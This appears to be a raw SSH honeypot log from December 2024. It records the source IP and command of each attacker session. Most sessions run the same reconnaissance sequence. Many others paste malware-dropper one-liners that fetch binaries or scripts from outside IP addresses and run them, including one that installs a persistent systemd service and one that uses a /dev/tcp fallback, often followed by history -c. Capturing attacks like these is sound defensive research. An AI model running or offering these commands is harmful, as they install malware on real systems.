--- Start of remote_exec_dallas_07-10_12_24.log ---
start
2024-12-07 14:09:06.866359 - ('45.148.10.203', 39544) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 14:35:32.884848 - ('116.38.53.235', 52995) - /ip cloud print
2024-12-07 14:35:34.013765 - ('116.38.53.235', 52995) - ifconfig
2024-12-07 14:35:34.933567 - ('116.38.53.235', 52995) - uname -a
2024-12-07 14:35:35.848512 - ('116.38.53.235', 52995) - cat /proc/cpuinfo
2024-12-07 14:35:36.768590 - ('116.38.53.235', 52995) - ps | grep '[Mm]iner'
2024-12-07 14:35:37.688621 - ('116.38.53.235', 52995) - ps -ef | grep '[Mm]iner'
2024-12-07 14:35:38.609055 - ('116.38.53.235', 52995) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 14:35:39.526062 - ('116.38.53.235', 52995) - echo Hi | cat -n
2024-12-07 16:21:39.474748 - ('210.108.85.147', 52631) - /ip cloud print
2024-12-07 16:21:40.698826 - ('210.108.85.147', 52631) - ifconfig
2024-12-07 16:21:41.698808 - ('210.108.85.147', 52631) - uname -a
2024-12-07 16:21:42.698543 - ('210.108.85.147', 52631) - cat /proc/cpuinfo
2024-12-07 16:21:43.698598 - ('210.108.85.147', 52631) - ps | grep '[Mm]iner'
2024-12-07 16:21:44.698419 - ('210.108.85.147', 52631) - ps -ef | grep '[Mm]iner'
2024-12-07 16:21:45.698413 - ('210.108.85.147', 52631) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 16:21:46.698327 - ('210.108.85.147', 52631) - echo Hi | cat -n
2024-12-07 17:36:03.146261 - ('112.120.21.46', 49747) - /ip cloud print
2024-12-07 17:36:04.378362 - ('112.120.21.46', 49747) - ifconfig
2024-12-07 17:36:05.392718 - ('112.120.21.46', 49747) - uname -a
2024-12-07 17:36:06.428336 - ('112.120.21.46', 49747) - cat /proc/cpuinfo
2024-12-07 17:36:07.441875 - ('112.120.21.46', 49747) - ps | grep '[Mm]iner'
2024-12-07 17:36:08.458100 - ('112.120.21.46', 49747) - ps -ef | grep '[Mm]iner'
2024-12-07 17:36:09.468770 - ('112.120.21.46', 49747) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 17:36:10.502064 - ('112.120.21.46', 49747) - echo Hi | cat -n
2024-12-07 17:39:42.231205 - ('180.225.93.115', 54324) - /ip cloud print
2024-12-07 17:39:43.455177 - ('180.225.93.115', 54324) - ifconfig
2024-12-07 17:39:44.455145 - ('180.225.93.115', 54324) - uname -a
2024-12-07 17:39:45.455027 - ('180.225.93.115', 54324) - cat /proc/cpuinfo
2024-12-07 17:39:46.455182 - ('180.225.93.115', 54324) - ps | grep '[Mm]iner'
2024-12-07 17:39:47.455113 - ('180.225.93.115', 54324) - ps -ef | grep '[Mm]iner'
2024-12-07 17:39:48.454921 - ('180.225.93.115', 54324) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 17:39:49.455225 - ('180.225.93.115', 54324) - echo Hi | cat -n
2024-12-07 21:10:38.419019 - ('45.148.10.203', 57278) - apt
2024-12-07 21:10:38.953010 - ('45.148.10.203', 57278) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:24:16.677744 - ('122.41.244.102', 34510) - /ip cloud print
2024-12-07 21:24:17.914294 - ('122.41.244.102', 34510) - ifconfig
2024-12-07 21:24:18.931271 - ('122.41.244.102', 34510) - uname -a
2024-12-07 21:24:19.946654 - ('122.41.244.102', 34510) - cat /proc/cpuinfo
2024-12-07 21:24:20.966705 - ('122.41.244.102', 34510) - ps | grep '[Mm]iner'
2024-12-07 21:24:21.975693 - ('122.41.244.102', 34510) - ps -ef | grep '[Mm]iner'
2024-12-07 21:24:22.978899 - ('122.41.244.102', 34510) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 21:24:23.986138 - ('122.41.244.102', 34510) - echo Hi | cat -n
2024-12-07 21:51:19.910928 - ('45.148.10.46', 40184) - apt
2024-12-07 21:51:21.110987 - ('45.148.10.46', 40184) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:51:29.516209 - ('45.148.10.46', 41980) - apt
2024-12-07 21:51:32.018170 - ('45.148.10.46', 41980) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:51:39.006832 - ('45.148.10.46', 49572) - apt
2024-12-07 21:51:39.816104 - ('45.148.10.46', 49572) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:52:26.950712 - ('45.148.10.46', 33728) - apt
2024-12-07 21:52:28.425032 - ('45.148.10.46', 33728) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:52:36.406933 - ('45.148.10.46', 52564) - apt
2024-12-07 21:52:37.272907 - ('45.148.10.46', 52564) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:52:48.207922 - ('45.148.10.46', 47666) - apt
2024-12-07 21:52:49.414761 - ('45.148.10.46', 47666) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:52:59.308772 - ('45.148.10.46', 34654) - apt
2024-12-07 21:53:01.417154 - ('45.148.10.46', 34654) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 21:53:10.219212 - ('45.148.10.46', 58734) - apt
2024-12-07 21:53:12.248284 - ('45.148.10.46', 58734) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:23:22.677824 - ('87.120.113.231', 60508) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-08 00:24:51.063536 - ('122.33.189.3', 51812) - /ip cloud print
2024-12-08 00:24:52.379509 - ('122.33.189.3', 51812) - ifconfig
2024-12-08 00:24:53.403435 - ('122.33.189.3', 51812) - uname -a
2024-12-08 00:24:54.427316 - ('122.33.189.3', 51812) - cat /proc/cpuinfo
2024-12-08 00:24:55.447349 - ('122.33.189.3', 51812) - ps | grep '[Mm]iner'
2024-12-08 00:24:56.471453 - ('122.33.189.3', 51812) - ps -ef | grep '[Mm]iner'
2024-12-08 00:24:57.495664 - ('122.33.189.3', 51812) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 00:24:58.515313 - ('122.33.189.3', 51812) - echo Hi | cat -n
2024-12-08 00:50:48.040799 - ('58.149.249.246', 51675) - /ip cloud print
2024-12-08 00:50:49.308968 - ('58.149.249.246', 51675) - ifconfig
2024-12-08 00:50:50.292934 - ('58.149.249.246', 51675) - uname -a
2024-12-08 00:50:51.276782 - ('58.149.249.246', 51675) - cat /proc/cpuinfo
2024-12-08 00:50:52.256898 - ('58.149.249.246', 51675) - ps | grep '[Mm]iner'
2024-12-08 00:50:53.236777 - ('58.149.249.246', 51675) - ps -ef | grep '[Mm]iner'
2024-12-08 00:50:54.220662 - ('58.149.249.246', 51675) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 00:50:55.196832 - ('58.149.249.246', 51675) - echo Hi | cat -n
2024-12-08 05:35:44.550155 - ('210.206.101.57', 47604) - /ip cloud print
2024-12-08 05:35:45.731064 - ('210.206.101.57', 47604) - ifconfig
2024-12-08 05:35:46.690054 - ('210.206.101.57', 47604) - uname -a
2024-12-08 05:35:47.655120 - ('210.206.101.57', 47604) - cat /proc/cpuinfo
2024-12-08 05:35:48.614050 - ('210.206.101.57', 47604) - ps | grep '[Mm]iner'
2024-12-08 05:35:49.579683 - ('210.206.101.57', 47604) - ps -ef | grep '[Mm]iner'
2024-12-08 05:35:50.551343 - ('210.206.101.57', 47604) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 05:35:51.515548 - ('210.206.101.57', 47604) - echo Hi | cat -n
2024-12-08 06:14:23.294152 - ('61.33.241.233', 57707) - /ip cloud print
2024-12-08 06:14:24.449986 - ('61.33.241.233', 57707) - ifconfig
2024-12-08 06:14:25.397948 - ('61.33.241.233', 57707) - uname -a
2024-12-08 06:14:26.345821 - ('61.33.241.233', 57707) - cat /proc/cpuinfo
2024-12-08 06:14:27.297819 - ('61.33.241.233', 57707) - ps | grep '[Mm]iner'
2024-12-08 06:14:28.253838 - ('61.33.241.233', 57707) - ps -ef | grep '[Mm]iner'
2024-12-08 06:14:29.205862 - ('61.33.241.233', 57707) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 06:14:30.153734 - ('61.33.241.233', 57707) - echo Hi | cat -n
2024-12-08 07:26:12.090568 - ('45.148.10.203', 48584) - apt
2024-12-08 07:26:12.598002 - ('45.148.10.203', 48584) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 10:53:40.527876 - ('218.92.0.132', 50798) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-08 10:53:41.730641 - ('218.92.0.132', 50798) - ls -la /var/run/gcc.pid
2024-12-08 11:40:12.516437 - ('124.54.248.231', 59617) - /ip cloud print
2024-12-08 11:40:13.725483 - ('124.54.248.231', 59617) - ifconfig
2024-12-08 11:40:14.745503 - ('124.54.248.231', 59617) - uname -a
2024-12-08 11:40:15.769720 - ('124.54.248.231', 59617) - cat /proc/cpuinfo
2024-12-08 11:40:16.793358 - ('124.54.248.231', 59617) - ps | grep '[Mm]iner'
2024-12-08 11:40:17.817394 - ('124.54.248.231', 59617) - ps -ef | grep '[Mm]iner'
2024-12-08 11:40:18.841315 - ('124.54.248.231', 59617) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 11:40:19.921325 - ('124.54.248.231', 59617) - echo Hi | cat -n
2024-12-08 12:12:56.499049 - ('87.120.113.231', 34886) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-08 12:50:04.151579 - ('116.38.89.114', 38445) - /ip cloud print
2024-12-08 12:50:05.356234 - ('116.38.89.114', 38445) - ifconfig
2024-12-08 12:50:06.340790 - ('116.38.89.114', 38445) - uname -a
2024-12-08 12:50:07.328099 - ('116.38.89.114', 38445) - cat /proc/cpuinfo
2024-12-08 12:50:08.308632 - ('116.38.89.114', 38445) - ps | grep '[Mm]iner'
2024-12-08 12:50:09.347258 - ('116.38.89.114', 38445) - ps -ef | grep '[Mm]iner'
2024-12-08 12:50:10.335244 - ('116.38.89.114', 38445) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 12:50:11.319213 - ('116.38.89.114', 38445) - echo Hi | cat -n
2024-12-08 13:39:19.408013 - ('45.148.10.46', 42190) - apt
2024-12-08 13:39:20.208879 - ('45.148.10.46', 42190) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:39:28.511177 - ('45.148.10.46', 38680) - apt
2024-12-08 13:39:29.610288 - ('45.148.10.46', 38680) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:39:37.716458 - ('45.148.10.46', 49762) - apt
2024-12-08 13:39:38.510181 - ('45.148.10.46', 49762) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:39:46.222024 - ('45.148.10.46', 33898) - apt
2024-12-08 13:39:46.657053 - ('45.148.10.46', 33898) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:39:54.423504 - ('45.148.10.46', 45006) - apt
2024-12-08 13:39:55.910811 - ('45.148.10.46', 45006) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:02.912492 - ('45.148.10.46', 48922) - apt
2024-12-08 13:40:03.710738 - ('45.148.10.46', 48922) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:11.011183 - ('45.148.10.46', 51700) - apt
2024-12-08 13:40:11.620252 - ('45.148.10.46', 51700) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:19.608938 - ('45.148.10.46', 51710) - apt
2024-12-08 13:40:20.712111 - ('45.148.10.46', 51710) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:28.014386 - ('45.148.10.46', 49166) - apt
2024-12-08 13:40:29.307528 - ('45.148.10.46', 49166) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:35.809267 - ('45.148.10.46', 36430) - apt
2024-12-08 13:40:36.437999 - ('45.148.10.46', 36430) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:46.318476 - ('45.148.10.46', 47236) - apt
2024-12-08 13:40:46.912475 - ('45.148.10.46', 47236) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:40:55.726842 - ('45.148.10.46', 56286) - apt
2024-12-08 13:40:56.707783 - ('45.148.10.46', 56286) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:02.910415 - ('45.148.10.46', 37676) - apt
2024-12-08 13:41:04.129537 - ('45.148.10.46', 37676) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:11.659098 - ('45.148.10.46', 54080) - apt
2024-12-08 13:41:12.407902 - ('45.148.10.46', 54080) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:21.112656 - ('45.148.10.46', 54082) - apt
2024-12-08 13:41:21.833305 - ('45.148.10.46', 54082) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:30.011427 - ('45.148.10.46', 36872) - apt
2024-12-08 13:41:31.110677 - ('45.148.10.46', 36872) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:37.108951 - ('45.148.10.46', 60794) - apt
